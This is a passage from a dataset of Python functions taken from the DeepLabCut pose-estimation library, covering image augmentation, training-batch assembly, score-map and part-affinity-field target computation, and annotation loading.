            pipeline.add(sometimes(iaa.Affine(rotate=(-opt, opt))))
        else:
            pipeline.add(sometimes(iaa.Affine(rotate=(-10, 10))))
    if cfg.get('hist_eq', False):
        pipeline.add(sometimes(iaa.AllChannelsHistogramEqualization()))
    if cfg.get('motion_blur', False):
        opts = cfg.get('motion_blur', False)
        if type(opts) == list:
            opts = dict(opts)
            pipeline.add(sometimes(iaa.MotionBlur(**opts)))
        else:
            pipeline.add(sometimes(iaa.MotionBlur(k=7, angle=(-90, 90))))
    if cfg.get('covering', False):
        pipeline.add(sometimes(iaa.CoarseDropout((0, 0.02), size_percent=(0.01, 0.05))))
    if cfg.get('elastic_transform', False):
        pipeline.add(sometimes(iaa.ElasticTransformation(sigma=5)))
    if cfg.get('gaussian_noise', False):
        opt = cfg.get('gaussian_noise', False)
        if type(opt) == int or type(opt) == float:
            pipeline.add(sometimes(iaa.AdditiveGaussianNoise(loc=0, scale=(0.0, opt), per_channel=0.5)))
        else:
            pipeline.add(sometimes(iaa.AdditiveGaussianNoise(loc=0, scale=(0.0, 0.05 * 255), per_channel=0.5)))
    if cfg.get('grayscale', False):
        pipeline.add(sometimes(iaa.Grayscale(alpha=(0.5, 1.0))))

    def get_aug_param(cfg_value):
        if isinstance(cfg_value, dict):
            opt = cfg_value
        else:
            opt = {}
        return opt
    cfg_cnt = cfg.get('contrast', {})
    cfg_cnv = cfg.get('convolution', {})
    contrast_aug = ['histeq', 'clahe', 'gamma', 'sigmoid', 'log', 'linear']
    for aug in contrast_aug:
        aug_val = cfg_cnt.get(aug, False)
        cfg_cnt[aug] = aug_val
        if aug_val:
            cfg_cnt[aug + 'ratio'] = cfg_cnt.get(aug + 'ratio', 0.1)
    convolution_aug = ['sharpen', 'emboss', 'edge']
    for aug in convolution_aug:
        aug_val = cfg_cnv.get(aug, False)
        cfg_cnv[aug] = aug_val
        if aug_val:
            cfg_cnv[aug + 'ratio'] = cfg_cnv.get(aug + 'ratio', 0.1)
    if cfg_cnt['histeq']:
        opt = get_aug_param(cfg_cnt['histeq'])
        pipeline.add(iaa.Sometimes(cfg_cnt['histeqratio'], iaa.AllChannelsHistogramEqualization(**opt)))
    if cfg_cnt['clahe']:
        opt = get_aug_param(cfg_cnt['clahe'])
        pipeline.add(iaa.Sometimes(cfg_cnt['claheratio'], iaa.AllChannelsCLAHE(**opt)))
    if cfg_cnt['log']:
        opt = get_aug_param(cfg_cnt['log'])
        pipeline.add(iaa.Sometimes(cfg_cnt['logratio'], iaa.LogContrast(**opt)))
    if cfg_cnt['linear']:
        opt = get_aug_param(cfg_cnt['linear'])
        pipeline.add(iaa.Sometimes(cfg_cnt['linearratio'], iaa.LinearContrast(**opt)))
    if cfg_cnt['sigmoid']:
        opt = get_aug_param(cfg_cnt['sigmoid'])
        pipeline.add(iaa.Sometimes(cfg_cnt['sigmoidratio'], iaa.SigmoidContrast(**opt)))
    if cfg_cnt['gamma']:
        opt = get_aug_param(cfg_cnt['gamma'])
        pipeline.add(iaa.Sometimes(cfg_cnt['gammaratio'], iaa.GammaContrast(**opt)))
    if cfg_cnv['sharpen']:
        opt = get_aug_param(cfg_cnv['sharpen'])
        pipeline.add(iaa.Sometimes(cfg_cnv['sharpenratio'], iaa.Sharpen(**opt)))
    if cfg_cnv['emboss']:
        opt = get_aug_param(cfg_cnv['emboss'])
        pipeline.add(iaa.Sometimes(cfg_cnv['embossratio'], iaa.Emboss(**opt)))
    if cfg_cnv['edge']:
        opt = get_aug_param(cfg_cnv['edge'])
        pipeline.add(iaa.Sometimes(cfg_cnv['edgeratio'], iaa.EdgeDetect(**opt)))
    return pipeline"
AlexEMG/DeepLabCut,get_batch_from_video,"def get_batch_from_video(self):
    num_images = len(self.vid)
    batch_images = []
    batch_joints = []
    joint_ids = []
    data_items = []
    trim_ends = self.cfg.get('trim_ends', None)
    if trim_ends is None:
        trim_ends = 0
    img_idx = np.random.choice(len(self.data) - trim_ends * 2, size=self.batch_size, replace=True)
    for i in range(self.batch_size):
        index = img_idx[i]
        offset = trim_ends
        data_item = self.data[index + offset]
        data_items.append(data_item)
        im_file = data_item.im_path
        logging.debug('image %s', im_file)
        self.vid.set_to_frame(index + offset)
        image = self.vid.read_frame()
        if self.has_gt:
            joints = data_item.joints
            if len(joints[0]) == 0:
                return (None, None, None, None)
            kpts = np.full((self._n_kpts * self._n_animals, 2), np.nan)
            for j in range(self._n_animals):
                for (n, x, y) in joints.get(j, []):
                    kpts[j * self._n_kpts + int(n)] = (x, y)
            joint_id = [np.array(list(range(self._n_kpts))) for _ in range(self._n_animals)]
            joint_ids.append(joint_id)
            batch_joints.append(kpts)
        batch_images.append(image)
    return (batch_images, joint_ids, batch_joints, data_items)"
AlexEMG/DeepLabCut,get_batch,"def get_batch(self):
    img_idx = np.random.choice(self.num_images, size=self.batch_size, replace=True)
    batch_images = []
    batch_joints = []
    joint_ids = []
    data_items = []
    for i in range(self.batch_size):
        data_item = self.data[img_idx[i]]
        data_items.append(data_item)
        im_file = data_item.im_path
        logging.debug('image %s', im_file)
        image = imread(os.path.join(self.cfg['project_path'], im_file), mode='skimage')
        if self.has_gt:
            joints = data_item.joints
            kpts = np.full((self._n_kpts * self._n_animals, 2), np.nan)
            for j in range(self._n_animals):
                for (n, x, y) in joints.get(j, []):
                    kpts[j * self._n_kpts + int(n)] = (x, y)
            joint_id = [np.array(list(range(self._n_kpts))) for _ in range(self._n_animals)]
            joint_ids.append(joint_id)
            batch_joints.append(kpts)
        batch_images.append(image)
    return (batch_images, joint_ids, batch_joints, data_items)"
AlexEMG/DeepLabCut,get_targetmaps_update,"def get_targetmaps_update(self, joint_ids, joints, data_items, sm_size, scale):
    part_score_targets = []
    part_score_weights = []
    locref_targets = []
    locref_masks = []
    partaffinityfield_targets = []
    partaffinityfield_masks = []
    for i in range(len(data_items)):
        if self.cfg.get('scmap_type', None) == 'gaussian':
            assert 0 == 1
            (part_score_target, part_score_weight, locref_target, locref_mask) = self.gaussian_scmap(joint_ids[i], [joints[i]], data_items[i], sm_size, scale)
        else:
            (part_score_target, part_score_weight, locref_target, locref_mask, partaffinityfield_target, partaffinityfield_mask) = self.compute_target_part_scoremap_numpy(joint_ids[i], joints[i], data_items[i], sm_size, scale)
        part_score_targets.append(part_score_target)
        part_score_weights.append(part_score_weight)
        locref_targets.append(locref_target)
        locref_masks.append(locref_mask)
        partaffinityfield_targets.append(partaffinityfield_target)
        partaffinityfield_masks.append(partaffinityfield_mask)
    return {Batch.part_score_targets: part_score_targets, Batch.part_score_weights: part_score_weights, Batch.locref_targets: locref_targets, Batch.locref_mask: locref_masks, Batch.pairwise_targets: partaffinityfield_targets, Batch.pairwise_mask: partaffinityfield_masks}"
AlexEMG/DeepLabCut,calc_target_and_scoremap_sizes,"def calc_target_and_scoremap_sizes(self):
    target_size = self.default_size * self.sample_scale()
    target_size = np.ceil(target_size).astype(int)
    if not self.is_valid_size(target_size):
        target_size = self.default_size
    stride = self.cfg['stride']
    sm_size = np.ceil(target_size / (stride * self.cfg.get('smfactor', 2))).astype(int) * self.cfg.get('smfactor', 2)
    if stride == 2:
        sm_size = np.ceil(target_size / 16).astype(int)
        sm_size *= 8
    return (target_size, sm_size)"
AlexEMG/DeepLabCut,next_batch,"def next_batch(self, plotting=False):
    while True:
        if self.vid:
            (batch_images, joint_ids, batch_joints, data_items) = self.get_batch_from_video()
        else:
            (batch_images, joint_ids, batch_joints, data_items) = self.get_batch()
        if batch_joints is None or batch_images is None:
            continue
        (target_size, sm_size) = self.calc_target_and_scoremap_sizes()
        scale = np.mean(target_size / self.default_size)
        augmentation.update_crop_size(self.pipeline, *target_size)
        (batch_images, batch_joints) = self.pipeline(images=batch_images, keypoints=batch_joints)
        batch_images = np.asarray(batch_images)
        image_shape = batch_images.shape[1:3]
        batch_joints_valid = []
        joint_ids_valid = []
        for (joints, ids) in zip(batch_joints, joint_ids):
            visible = ~np.isnan(joints[:, 0])
            inside = np.logical_and.reduce((joints[:, 0] < image_shape[1], joints[:, 0] > 0, joints[:, 1] < image_shape[0], joints[:, 1] > 0))
            mask = visible & inside
            batch_joints_valid.append(joints[mask])
            temp = []
            start = 0
            for array in ids:
                end = start + array.size
                inds = np.arange(start, end)
                temp.append(array[mask[inds]])
                start = end
            joint_ids_valid.append(temp)
        if plotting:
            for i in range(self.batch_size):
                joints = batch_joints_valid[i]
                kps = KeypointsOnImage([Keypoint(x=joint[0], y=joint[1]) for joint in joints], shape=batch_images[i].shape)
                im = kps.draw_on_image(batch_images[i])
                imageio.imwrite(os.path.join(self.cfg['project_path'], str(i) + '.png'), im)
        batch = {Batch.inputs: batch_images.astype(np.float64)}
        if self.has_gt:
            targetmaps = self.get_targetmaps_update(joint_ids_valid, batch_joints_valid, data_items, (sm_size[1], sm_size[0]), scale)
            batch.update(targetmaps)
        batch = {key: np.asarray(data) for (key, data) in batch.items()}
        batch[Batch.data_item] = data_items
        return batch"
AlexEMG/DeepLabCut,set_test_mode,"def set_test_mode(self, test_mode):
    self.has_gt = not test_mode"
AlexEMG/DeepLabCut,num_training_samples,"def num_training_samples(self):
    num = self.num_images
    if self.cfg['mirror']:
        num *= 2
    return num"
AlexEMG/DeepLabCut,is_valid_size,"def is_valid_size(self, target_size):
    (im_width, im_height) = target_size
    min_input_size = self.cfg.get('min_input_size', 100)
    if im_height < min_input_size or im_width < min_input_size:
        return False
    if 'max_input_size' in self.cfg:
        max_input_size = self.cfg['max_input_size']
        if im_width * im_height > max_input_size * max_input_size:
            return False
    return True"
AlexEMG/DeepLabCut,compute_scmap_weights,"def compute_scmap_weights(self, scmap_shape, joint_id):
    cfg = self.cfg
    if cfg['weigh_only_present_joints']:
        weights = np.zeros(scmap_shape)
        for (k, j_id) in enumerate(np.concatenate(joint_id)):
            weights[:, :, j_id] = 1.0
    else:
        weights = np.ones(scmap_shape)
    return weights"
AlexEMG/DeepLabCut,compute_target_part_scoremap_numpy,"def compute_target_part_scoremap_numpy(self, joint_id, coords, data_item, size, scale):
    stride = self.cfg['stride']
    half_stride = stride // 2
    dist_thresh = float(self.cfg['pos_dist_thresh'] * scale)
    num_idchannel = self.cfg.get('num_idchannel', 0)
    num_joints = self.cfg['num_joints']
    scmap = np.zeros((*size, num_joints + num_idchannel))
    locref_size = (*size, num_joints * 2)
    locref_map = np.zeros(locref_size)
    locref_scale = 1.0 / self.cfg['locref_stdev']
    dist_thresh_sq = dist_thresh ** 2
    partaffinityfield_shape = (*size, self.cfg['num_limbs'] * 2)
    partaffinityfield_map = np.zeros(partaffinityfield_shape)
    if self.cfg['weigh_only_present_joints']:
        partaffinityfield_mask = np.zeros(partaffinityfield_shape)
        locref_mask = np.zeros(locref_size)
    else:
        partaffinityfield_mask = np.ones(partaffinityfield_shape)
        locref_mask = np.ones(locref_size)
    (height, width) = size
    grid = np.mgrid[:height, :width].transpose((1, 2, 0))
    xx = np.expand_dims(grid[..., 1], axis=2)
    yy = np.expand_dims(grid[..., 0], axis=2)
    coords_sm = np.round((coords - half_stride) / stride).astype(int)
    mins = np.round(np.maximum(coords_sm - dist_thresh - 1, 0)).astype(int)
    maxs = np.round(np.minimum(coords_sm + dist_thresh + 1, [width - 1, height - 1])).astype(int)
    dx = coords[:, 0] - xx * stride - half_stride
    dx_ = dx * locref_scale
    dy = coords[:, 1] - yy * stride - half_stride
    dy_ = dy * locref_scale
    dist = dx ** 2 + dy ** 2
    mask1 = dist <= dist_thresh_sq
    mask2 = (xx >= mins[:, 0]) & (xx <= maxs[:, 0])
    mask3 = (yy >= mins[:, 1]) & (yy <= maxs[:, 1])
    mask = mask1 & mask2 & mask3
    for (n, ind) in enumerate(np.concatenate(joint_id).tolist()):
        mask_ = mask[..., n]
        scmap[mask_, ind] = 1
        if self.cfg['weigh_only_present_joints']:
            locref_mask[mask_, [ind * 2 + 0, ind * 2 + 1]] = 1.0
        locref_map[mask_, ind * 2 + 0] = dx_[mask_, n]
        locref_map[mask_, ind * 2 + 1] = dy_[mask_, n]
    if num_idchannel > 0:
        coordinateoffset = 0
        idx = [(i, id_) for (i, id_) in enumerate(data_item.joints) if id_ < num_idchannel]
        for (i, person_id) in idx:
            joint_ids = joint_id[i]
            n_joints = joint_ids.size
            if n_joints:
                inds = np.arange(n_joints) + coordinateoffset
                mask_ = mask[..., inds].any(axis=2)
                scmap[mask_, person_id + num_joints] = 1
            coordinateoffset += n_joints
    coordinateoffset = 0
    (y, x) = np.rollaxis(grid * stride + half_stride, 2)
    if self.cfg['partaffinityfield_graph']:
        for person_id in range(len(joint_id)):
            joint_ids = joint_id[person_id].tolist()
            if len(joint_ids) >= 2:
                for (l, (bp1, bp2)) in enumerate(self.cfg['partaffinityfield_graph']):
                    try:
                        ind1 = joint_ids.index(bp1)
                    except ValueError:
                        continue
                    try:
                        ind2 = joint_ids.index(bp2)
                    except ValueError:
                        continue
                    (j_x, j_y) = coords[ind1 + coordinateoffset]
                    (linkedj_x, linkedj_y) = coords[ind2 + coordinateoffset]
                    dist = sqrt((linkedj_x - j_x) ** 2 + (linkedj_y - j_y) ** 2)
                    if dist > 0:
                        Dx = (linkedj_x - j_x) / dist
                        Dy = (linkedj_y - j_y) / dist
                        d1 = [Dx * j_x + Dy * j_y, Dx * linkedj_x + Dy * linkedj_y]
                        d1lowerboundary = min(d1)
                        d1upperboundary = max(d1)
                        d2mid = j_y * Dx - j_x * Dy
                        distance_along = Dx * x + Dy * y
                        distance_across = (y * Dx - x * Dy - d2mid) * 1.0 / self.cfg['pafwidth'] * scale
                        mask1 = (distance_along >= d1lowerboundary) & (distance_along <= d1upperboundary)
                        distance_across_abs = np.abs(distance_across)
                        mask2 = distance_across_abs <= 1
                        mask = mask1 & mask2
                        temp = 1 - distance_across_abs[mask]
                        if self.cfg['weigh_only_present_joints']:
                            partaffinityfield_mask[mask, [l * 2 + 0, l * 2 + 1]] = 1.0
                        partaffinityfield_map[mask, l * 2 + 0] = Dx * temp
                        partaffinityfield_map[mask, l * 2 + 1] = Dy * temp
            coordinateoffset += len(joint_ids)
    weights = self.compute_scmap_weights(scmap.shape, joint_id)
    return (scmap, weights, locref_map, locref_mask, partaffinityfield_map, partaffinityfield_mask)"
AlexEMG/DeepLabCut,gaussian_scmap,"def gaussian_scmap(self, joint_id, coords, data_item, size, scale):
    stride = self.cfg['stride']
    dist_thresh = float(self.cfg['pos_dist_thresh'] * scale)
    num_idchannel = self.cfg.get('num_idchannel', 0)
    num_joints = self.cfg['num_joints']
    half_stride = stride / 2
    scmap = np.zeros(np.concatenate([size, np.array([num_joints])]))
    locref_size = np.concatenate([size, np.array([num_joints * 2])])
    locref_mask = np.zeros(locref_size)
    locref_map = np.zeros(locref_size)
    locref_scale = 1.0 / self.cfg['locref_stdev']
    dist_thresh_sq = dist_thresh ** 2
    partaffinityfield_shape = np.concatenate([size, np.array([self.cfg['num_limbs'] * 2])])
    partaffinityfield_map = np.zeros(partaffinityfield_shape)
    if self.cfg['weigh_only_present_joints']:
        partaffinityfield_mask = np.zeros(partaffinityfield_shape)
        locref_mask = np.zeros(locref_size)
    else:
        partaffinityfield_mask = np.ones(partaffinityfield_shape)
        locref_mask = np.ones(locref_size)
    std = dist_thresh / 4
    width = size[1]
    height = size[0]
    grid = np.mgrid[:height, :width].transpose((1, 2, 0))
    grid = grid * stride + half_stride
    for (k, j_id) in enumerate(np.concatenate(joint_id)):
        joint_pt = coords[0][k, :]
        j_x = joint_pt[0].item()
        j_x_sm = round((j_x - half_stride) / stride)
        j_y = joint_pt[1].item()
        j_y_sm = round((j_y - half_stride) / stride)
        map_j = grid.copy()
        dist = np.linalg.norm(grid - (j_y, j_x), axis=2) ** 2
        scmap_j = np.exp(-dist / (2 * std ** 2))
        scmap[..., j_id] = scmap_j
        locref_mask[dist <= dist_thresh_sq, j_id * 2 + 0] = 1
        locref_mask[dist <= dist_thresh_sq, j_id * 2 + 1] = 1
        dx = j_x - grid.copy()[:, :, 1]
        dy = j_y - grid.copy()[:, :, 0]
        locref_map[..., j_id * 2 + 0] = dx * locref_scale
        locref_map[..., j_id * 2 + 1] = dy * locref_scale
    if num_idchannel > 0:
        assert 0 == 1
    coordinateoffset = 0
    for person_id in range(len(joint_id)):
        joint_ids = joint_id[person_id].copy()
        if len(joint_ids) > 1:
            for l in range(self.cfg['num_limbs']):
                (bp1, bp2) = self.cfg['partaffinityfield_graph'][l]
                I1 = np.where(np.array(joint_ids) == bp1)[0]
                I2 = np.where(np.array(joint_ids) == bp2)[0]
                if (len(I1) > 0) * (len(I2) > 0):
                    indbp1 = I1[0].item()
                    indbp2 = I2[0].item()
                    j_x = coords[0][indbp1 + coordinateoffset, 0].item()
                    j_y = coords[0][indbp1 + coordinateoffset, 1].item()
                    linkedj_x = coords[0][indbp2 + coordinateoffset, 0].item()
                    linkedj_y = coords[0][indbp2 + coordinateoffset, 1].item()
                    dist = np.sqrt((linkedj_x - j_x) ** 2 + (linkedj_y - j_y) ** 2)
                    if dist > 0:
                        Dx = (linkedj_x - j_x) * 1.0 / dist
                        Dy = (linkedj_y - j_y) * 1.0 / dist
                        d1 = [Dx * j_x + Dy * j_y, Dx * linkedj_x + Dy * linkedj_y]
                        d1lowerboundary = min(d1)
                        d1upperboundary = max(d1)
                        d2mid = j_y * Dx - j_x * Dy
                        distance_along = Dx * (x * stride + half_stride) + Dy * (y * stride + half_stride)
                        distance_across = ((y * stride + half_stride) * Dx - (x * stride + half_stride) * Dy - d2mid) * 1.0 / self.cfg['pafwidth'] * scale
                        mask1 = (distance_along >= d1lowerboundary) & (distance_along <= d1upperboundary)
                        mask2 = np.abs(distance_across) <= 1
                        mask = mask1 & mask2
                        if self.cfg['weigh_only_present_joints']:
                            partaffinityfield_mask[mask, l * 2 + 0] = 1.0
                            partaffinityfield_mask[mask, l * 2 + 1] = 1.0
                        partaffinityfield_map[mask, l * 2 + 0] = (Dx * (1 - abs(distance_across)))[mask]
                        partaffinityfield_map[mask, l * 2 + 1] = (Dy * (1 - abs(distance_across)))[mask]
        coordinateoffset += len(joint_ids)
    weights = self.compute_scmap_weights(scmap.shape, joint_id)
    return (scmap, weights, locref_map, locref_mask)"
AlexEMG/DeepLabCut,get_aug_param,"def get_aug_param(cfg_value):
    if isinstance(cfg_value, dict):
        opt = cfg_value
    else:
        opt = {}
    return opt"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    super(ScalecropPoseDataset, self).__init__(cfg)
    self.cfg['deterministic'] = False
    self.max_input_sizesquare = cfg.get('max_input_size', 1500) ** 2
    self.min_input_sizesquare = cfg.get('min_input_size', 64) ** 2
    self.locref_scale = 1.0 / cfg['locref_stdev']
    self.stride = cfg['stride']
    self.half_stride = self.stride / 2
    self.scale_jitter_lo = cfg.get('scale_jitter_lo', 0.75)
    self.scale_jitter_up = cfg.get('scale_jitter_up', 1.25)
    self.cfg['crop'] = cfg.get('crop', True)
    self.cfg['cropratio'] = cfg.get('cropratio', 0.4)
    self.cfg['minsize'] = cfg.get('minsize', 100)
    self.cfg['leftwidth'] = cfg.get('leftwidth', 400)
    self.cfg['rightwidth'] = cfg.get('rightwidth', 400)
    self.cfg['topheight'] = cfg.get('topheight', 400)
    self.cfg['bottomheight'] = cfg.get('bottomheight', 400)"
AlexEMG/DeepLabCut,img_to_bgr,"def img_to_bgr(im_path):
    img = cv2.imread(im_path)
    return img"
AlexEMG/DeepLabCut,to_dict,"def to_dict(self):
    return self.__dict__"
AlexEMG/DeepLabCut,from_dict,"def from_dict(d):
    item = DataItem()
    for (k, v) in d.items():
        setattr(item, k, v)
    return item"
AlexEMG/DeepLabCut,__init__,"def __init__(self, wmin, hmin, wmax=None, hmax=None):
    self.rng = get_rng()
    super().__init__(wmin, hmin, wmax, hmax)"
AlexEMG/DeepLabCut,get_transform,"def get_transform(self, img):
    hmax = self.hmax or img.shape[0]
    wmax = self.wmax or img.shape[1]
    hmin = min(self.hmin, img.shape[0])
    wmin = min(self.wmin, img.shape[1])
    hmax = min(hmax, img.shape[0])
    wmax = min(wmax, img.shape[1])
    h = self.rng.randint(hmin, hmax + 1)
    w = self.rng.randint(wmin, wmax + 1)
    diffh = img.shape[0] - h
    diffw = img.shape[1] - w
    assert diffh >= 0 and diffw >= 0
    y0 = 0 if diffh == 0 else self.rng.randint(diffh)
    x0 = 0 if diffw == 0 else self.rng.randint(diffw)
    crop_aug = CropTransform(y0, x0, h, w)
    return crop_aug"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg, shuffle=True, dir=None):
    self.shuffle = shuffle
    self.cfg = cfg
    self.data = self.load_dataset()
    self.has_gt = True"
AlexEMG/DeepLabCut,load_dataset,"def load_dataset(self):
    cfg = self.cfg
    file_name = os.path.join(self.cfg['project_path'], cfg['dataset'])
    mlab = sio.loadmat(file_name)
    self.raw_data = mlab
    mlab = mlab['dataset']
    num_images = mlab.shape[1]
    data = []
    has_gt = True
    for i in range(num_images):
        sample = mlab[0, i]
        item = DataItem()
        item.image_id = i
        base = str(self.cfg['project_path'])
        im_path = sample[0][0]
        if isinstance(im_path, str):
            im_path = robust_split_path(im_path)
        else:
            im_path = [s.strip() for s in im_path]
        item.im_path = os.path.join(base, *im_path)
        item.im_size = sample[1][0]
        if len(sample) >= 3:
            joints = sample[2][0][0]
            joint_id = joints[:, 0]
            if joint_id.size != 0:
                assert (joint_id < cfg['num_joints']).any()
            joints[:, 0] = joint_id
            coords = [joint[1:] for joint in joints]
            coords = arr(coords)
            item.coords = coords
            item.joints = [joints]
            item.joint_id = [arr(joint_id)]
        else:
            has_gt = False
        data.append(item)
    self.has_gt = has_gt
    return data"
AlexEMG/DeepLabCut,__iter__,"def __iter__(self):
    idxs = list(range(len(self.data)))
    while True:
        if self.shuffle:
            self.rng.shuffle(idxs)
        for k in idxs:
            data_item = self.data[k]
            yield data_item"
AlexEMG/DeepLabCut,__init__,"def __init__(self, cfg):
    cfg['scaleratio'] = cfg.get('scaleratio', 0.6)
    if cfg.get('rotation', True):
        if type(cfg.get('rotation', False)) == int:
            cfg['rotation'] = cfg.get('rotation', 25)
        else:
            cfg['rotation'] = 25
    else:
        cfg['rotratio'] = 0.0
        cfg['rotation'] = 0
    cfg['brightness_dif'] = cfg.get('brightness_dif', 0.3)
    cfg['brightnessratio'] = cfg.get('brightnessratio', 0.0)
    cfg['contrast_factor_lo'] = cfg.get('contrast_factor_lo', 0.5)
    cfg['contrast_factor_up'] = cfg.get('contrast_factor_up', 2.0)
    cfg['contrastratio'] = cfg.get('contrastratio', 0.2)
    cfg['saturation_max_dif'] = cfg.get('saturation_max_dif', 0.5)
    cfg['saturationratio'] = cfg.get('saturationratio', 0.0)
    cfg['noise_sigma'] = cfg.get('noise_sigma', 0.1)
    cfg['noiseratio'] = cfg.get('noiseratio', 0.0)
    cfg['blur_max_window_size'] = cfg.get('blur_max_window_size', 10)
    cfg['blurratio'] = cfg.get('blurratio', 0.2)
    cfg['is_rgb'] = cfg.get('is_rgb', True)
    cfg['to_clip'] = cfg.get('to_clip', True)
    cfg['processratio'] = cfg.get('processratio', 1)
    cfg['num_prefetch'] = cfg.get('num_prefetch', 50)
    cfg['minsize'] = cfg.get('minsize', 100)
    cfg['leftwidth'] = cfg.get('leftwidth', 400)
    cfg['rightwidth'] = cfg.get('rightwidth', 400)
    cfg['topheight'] = cfg.get('topheight', 400)
    cfg['bottomheight'] = cfg.get('bottomheight', 400)
    cfg['cropratio'] = cfg.get('cropratio', 0.4)
    super(TensorpackPoseDataset, self).__init__(cfg)
    self.scaling = RandomResize(xrange=(self.cfg['scale_jitter_lo'] * self.cfg['global_scale'], self.cfg['scale_jitter_up'] * self.cfg['global_scale']), aspect_ratio_thres=0.0)
    self.scaling_apply = RandomApplyAug(self.scaling, self.cfg['scaleratio'])
    self.cropping = RandomCropping(wmin=self.cfg['minsize'], hmin=self.cfg['minsize'], wmax=self.cfg['leftwidth'] + self.cfg['rightwidth'] + self.cfg['minsize'], hmax=self.cfg['topheight'] + self.cfg['bottomheight'] + self.cfg['minsize'])
    self.rotation = Rotation(max_deg=self.cfg['rotation'])
    self.brightness = Brightness(self.cfg['brightness_dif'])
    self.contrast = Contrast((self.cfg['contrast_factor_lo'], self.cfg['contrast_factor_up']), rgb=self.cfg['is_rgb'], clip=self.cfg['to_clip'])
    self.saturation = Saturation(self.cfg['saturation_max_dif'], rgb=self.cfg['is_rgb'])
    self.gaussian_noise = GaussianNoise(sigma=self.cfg['noise_sigma'])
    self.gaussian_blur = GaussianBlur(max_size=self.cfg['blur_max_window_size'])
    self.augmentors = [RandomApplyAug(self.cropping, self.cfg['cropratio']), RandomApplyAug(self.rotation, self.cfg['rotratio']), RandomApplyAug(self.brightness, self.cfg['brightnessratio']), RandomApplyAug(self.contrast, self.cfg['contrastratio']), RandomApplyAug(self.saturation, self.cfg['saturationratio']), RandomApplyAug(self.gaussian_noise, self.cfg['noiseratio']), RandomApplyAug(self.gaussian_blur, self.cfg['blurratio']), self.scaling_apply]
    self.has_gt = True
    self.set_shuffle(cfg['shuffle'])
    self.data = self.load_dataset()
    self.num_images = len(self.data)
    df = self.get_dataflow(self.cfg)
    df.reset_state()
    self.aug = iter(df)"
AlexEMG/DeepLabCut,load_dataset,"def load_dataset(self):
    p = Pose(cfg=self.cfg, shuffle=self.shuffle)
    return p.load_dataset()"
AlexEMG/DeepLabCut,augment,"def augment(self, data):
    img = img_to_bgr(data.im_path)
    coords = data.coords.astype('float64')
    scale = 1
    for aug in self.augmentors:
        tfm = aug.get_transform(img)
        aug_img = tfm.apply_image(img)
        aug_coords = tfm.apply_coords(coords)
        if aug is self.scaling_apply:
            scale = aug_img.shape[0] / img.shape[0]
        img = aug_img
        coords = aug_coords
    aug_img = img
    aug_coords = coords
    size = [aug_img.shape[0], aug_img.shape[1]]
    aug_coords = [aug_coords.reshape(int(len(aug_coords[~np.isnan(aug_coords)]) / 2), 2)]
    joint_id = data.joint_id
    return [joint_id, aug_img, aug_coords, data, size, scale]"
AlexEMG/DeepLabCut,get_dataflow,"def get_dataflow(self, cfg):
    df = Pose(cfg)
    df = MapData(df, self.augment)
    df = MapData(df, self.compute_target_part_scoremap)
    num_cores = multiprocessing.cpu_count()
    num_processes = int(num_cores * self.cfg['processratio'])
    if num_processes <= 1:
        num_processes = 2
    if os.name == 'nt':
        df2 = MultiProcessRunner(df, num_proc=num_processes, num_prefetch=self.cfg['num_prefetch'])
    else:
        df2 = MultiProcessRunnerZMQ(df, num_proc=num_processes, hwm=self.cfg['num_prefetch'])
    return df2"
AlexEMG/DeepLabCut,compute_target_part_scoremap,"def compute_target_part_scoremap(self, components):
    joint_id = components[0]
    aug_img = components[1]
    coords = components[2]
    data_item = components[3]
    img_size = components[4]
    scale = components[5]
    stride = self.cfg['stride']
    dist_thresh = self.cfg['pos_dist_thresh'] * scale
    num_joints = self.cfg['num_joints']
    half_stride = stride / 2
    size = np.ceil(arr(img_size) / (stride * 2)).astype(int) * 2
    scmap = np.zeros(np.append(size, num_joints))
    locref_size = np.append(size, num_joints * 2)
    locref_mask = np.zeros(locref_size)
    locref_map = np.zeros(locref_size)
    locref_scale = 1.0 / self.cfg['locref_stdev']
    dist_thresh_sq = dist_thresh ** 2
    width = size[1]
    height = size[0]
    for person_id in range(len(coords)):
        for (k, j_id) in enumerate(joint_id[person_id]):
            joint_pt = coords[person_id][k, :]
            j_x = np.asarray(joint_pt[0]).item()
            j_y = np.asarray(joint_pt[1]).item()
            j_x_sm = round((j_x - half_stride) / stride)
            j_y_sm = round((j_y - half_stride) / stride)
            min_x = round(max(j_x_sm - dist_thresh - 1, 0))
            max_x = round(min(j_x_sm + dist_thresh + 1, width - 1))
            min_y = round(max(j_y_sm - dist_thresh - 1, 0))
            max_y = round(min(j_y_sm + dist_thresh + 1, height - 1))
            for j in range(min_y, max_y + 1):
                pt_y = j * stride + half_stride
                for i in range(min_x, max_x + 1):
                    pt_x = i * stride + half_stride
                    dx = j_x - pt_x
                    dy = j_y - pt_y
                    dist = dx ** 2 + dy ** 2
                    if dist <= dist_thresh_sq:
                        scmap[j, i, j_id] = 1
                        locref_mask[j, i, j_id * 2 + 0] = 1
                        locref_mask[j, i, j_id * 2 + 1] = 1
                        locref_map[j, i, j_id * 2 + 0] = dx * locref_scale
                        locref_map[j, i, j_id * 2 + 1] = dy * locref_scale
    weights = self.compute_scmap_weights(scmap.shape, joint_id)
    mirror = False
    d = data_item.to_dict()
    d['image'] = aug_img
    return (d, scale, mirror, scmap, weights, locref_map, locref_mask)"
AlexEMG/DeepLabCut,set_test_mode,"def set_test_mode(self, test_mode):
    self.has_gt = not test_mode"
AlexEMG/DeepLabCut,set_shuffle,"def set_shuffle(self, shuffle):
    self.shuffle = shuffle
    if not shuffle:
        assert not self.cfg['mirror']
        self.image_indices = np.arange(self.num_images)"
AlexEMG/DeepLabCut,shuffle_images,"def shuffle_images(self):
    num_images = self.num_images
    if self.cfg['mirror']:
        image_indices = np.random.permutation(num_images * 2)
        self.mirrored = image_indices >= num_images
        image_indices[self.mirrored] = image_indices[self.mirrored] - num_images
        self.image_indices = image_indices
    else:
        self.image_indices = np.random.permutation(num_images)"
AlexEMG/DeepLabCut,next_batch,"def next_batch(self):
    next_batch = next(self.aug)
    return self.make_batch(next_batch)"
AlexEMG/DeepLabCut,is_valid_size,"def is_valid_size(self, image_size, scale):
    if 'min_input_size' in self.cfg and 'max_input_size' in self.cfg:
        input_width = image_size[2] * scale
        input_height = image_size[1] * scale
        if input_height < self.cfg['min_input_size'] or input_width < self.cfg['min_input_size']:
            return False
        if input_height * input_width > self.cfg['max_input_size'] ** 2:
            return False
    return True"
AlexEMG/DeepLabCut,make_batch,"def make_batch(self, components):
    data_item = DataItem.from_dict(components[0])
    mirror = components[2]
